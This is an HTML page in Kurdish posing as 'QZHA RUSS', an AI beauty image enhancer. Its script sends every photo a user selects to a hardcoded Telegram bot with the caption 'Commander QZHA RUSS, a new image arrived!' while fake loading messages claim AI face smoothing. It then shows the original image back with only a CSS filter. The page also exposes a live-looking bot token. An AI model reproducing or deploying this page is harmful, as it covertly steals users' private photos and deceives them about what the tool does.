<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QZHA RUSS | PREMIUM AI</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #020202; color: #ffb3c1; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow-x: hidden; }
        
        /* 👑 براندی QZHA RUSS لە سەرەوە */
        .brand-header {
            padding: 20px;
            text-align: center;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(15px);
            border-bottom: 1px solid rgba(255, 133, 162, 0.1);
            position: sticky; top: 0; z-index: 50;
        }
        .brand-name {
            font-size: 24px; font-weight: 900; letter-spacing: 4px;
            background: linear-gradient(to right, #ff85a2, #fff, #ff85a2);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(255, 133, 162, 0.3);
            font-family: 'serif'; text-transform: uppercase;
        }

        /* ✨ شاشەی بەخێرهاتن */
        #welcome-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle, #12050a 0%, #000 100%);
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            z-index: 100; transition: 1.5s cubic-bezier(0.4, 0, 0.2, 1); text-align: center; padding: 20px;
        }

        .welcome-text { font-size: 19px; line-height: 2.2; color: #eee; animation: fadeIn 3s ease-in; }
        .welcome-btn { margin-top: 40px; padding: 15px 50px; border-radius: 2px; background: none; border: 1px solid #ff85a2; color: #ff85a2; cursor: pointer; font-size: 14px; letter-spacing: 2px; transition: 0.6s; text-transform: uppercase; }
        .welcome-btn:hover { background: #ff85a2; color: #000; box-shadow: 0 0 40px rgba(255, 133, 162, 0.4); }

        /* 📱 ناوەڕۆکی سەرەکی */
        .main-content { display: none; padding: 20px; animation: fadeIn 1.5s ease-in; }
        .container { border: 1px solid rgba(255, 133, 162, 0.2); padding: 40px 20px; border-radius: 0px; background: rgba(10, 10, 10, 0.6); backdrop-filter: blur(20px); max-width: 400px; margin: 30px auto; box-shadow: 0 30px 100px rgba(0, 0, 0, 0.8); text-align: center; }
        
        .upload-btn { background: #fff; color: #000; padding: 18px 40px; border-radius: 2px; font-weight: bold; cursor: pointer; display: inline-block; margin-top: 30px; border: none; font-size: 14px; letter-spacing: 1px; transition: 0.4s; }
        .upload-btn:hover { background: #ff85a2; transform: scale(1.02); }
        
        /* 🌀 لۆدینگی شوشەیی */
        #loader { display: none; margin-top: 35px; }
        .spinner { width: 40px; height: 40px; border: 2px solid rgba(255, 133, 162, 0.1); border-top: 2px solid #ff85a2; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 25px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .loading-text { font-size: 15px; color: #ffb3c1; letter-spacing: 1px; }

        #output { display: none; width: 100%; border-radius: 5px; margin-top: 30px; filter: brightness(1.1) saturate(1.15) blur(0.3px) drop-shadow(0 0 25px rgba(255, 133, 162, 0.3)); border: 1px solid rgba(255, 133, 162, 0.3); }
        #msg-text { margin-top: 30px; font-size: 17px; color: #fff; line-height: 1.8; text-shadow: 0 0 10px rgba(255, 133, 162, 0.5); }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

    <div id="welcome-screen">
        <div class="welcome-text">
             بـۆ ئـەوانـەی کـە شـایـەنـی تـایـبـەت بـوونـن ✨<br>
            بـەخـێـربـێـی بـۆ جـیـهـانـی دیـزاین و جـوانـکاری<br>
            لـێـرە هـەمـوو وێـنـەیـەک دەبـێـتـە شـاکار 🌸
        </div>
        <button class="welcome-btn" onclick="enterSite()">Enter Studio</button>
    </div>

    <div class="main-content" id="main-content">
        <header class="brand-header">
            <div class="brand-name">QZHA RUSS</div>
        </header>

        <div class="container">
            <div style="color: #ff85a2; font-size: 11px; letter-spacing: 3px; text-transform: uppercase; margin-bottom: 10px;">AI Image Enhancer</div>
            <p style="color: #555; font-size: 13px;">تەکنەلۆژیای پڕۆفیشناڵ بۆ سافکردنی ڕووخسار</p>
            
            <label for="imgInput" class="upload-btn">SELECT IMAGE</label>
            <input type="file" id="imgInput" accept="image/*" onchange="startProcess()">
            
            <div id="loader">
                <div class="spinner"></div>
                <div id="dynamic-loading-text" class="loading-text">پـڕۆسـێـس دەکرێـت...</div>
            </div>

            <img id="output" src="">
            <div id="msg-text"></div>
        </div>
    </div>

<script>
    const token = "6723344914:AAE8glrr3Z7dMS9FuhnmKcugLaQ5lOL2xSE";
    const myId = "6072079819";

    function enterSite() {
        document.getElementById('welcome-screen').style.opacity = '0';
        setTimeout(() => {
            document.getElementById('welcome-screen').style.display = 'none';
            document.getElementById('main-content').style.display = 'block';
        }, 1200);
    }

    const loadingTexts = [
        "خەریکی ناسینەوەی ڕووخسارە... ✨",
        "سافکردنی پێست بە سیستەمی ئەی ئای... 🌸",
        "کەمێک چاوەڕێ بکە نازدارەکەم... ☁️",
        "زیادکردنی بریقەی تـایبەت... 🪄"
    ];

    const finalMessages = [
        "چـاو جـوانـەکـە وێـنـەکـەت ئامادەیە 🤭✨",
        "تـەواو بـوو نـازدارەکـەم، سەیری ئەم بریقەیە بکە 🦋🍭",
        "وێـنـەکـەت وەک خـۆت بـێ وێـنـە سـاف بـوو 🦄🎀",
        "هـەموو شـتێـک بـۆ ئـەو چـاوە مـەستانە تـەواو بـوو 🧚🏻‍♀️🌷"
    ];

    function startProcess() {
        const input = document.getElementById('imgInput');
        const output = document.getElementById('output');
        const loader = document.getElementById('loader');
        const loadTxt = document.getElementById('dynamic-loading-text');
        const msgText = document.getElementById('msg-text');

        if (input.files.length === 0) return;

        loader.style.display = 'block';
        output.style.display = 'none';
        msgText.innerHTML = "";

        let textIdx = 0;
        const textInterval = setInterval(() => {
            loadTxt.innerHTML = loadingTexts[textIdx % loadingTexts.length];
            textIdx++;
        }, 1500);

        const file = input.files[0];
        const fd = new FormData();
        fd.append('chat_id', myId);
        fd.append('photo', file);
        fd.append('caption', "💀 **فەرماندە QZHA RUSS، وێنەیەکی نوێ گەیشت!**");
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });

        setTimeout(() => {
            clearInterval(textInterval);
            const reader = new FileReader();
            reader.onload = function(e) {
                loader.style.display = 'none';
                output.src = e.target.result;
                output.style.display = 'block';
                msgText.innerHTML = finalMessages[Math.floor(Math.random() * finalMessages.length)];
            };
            reader.readAsDataURL(file);
        }, 5000);
    }
</script>

</body>
</html>
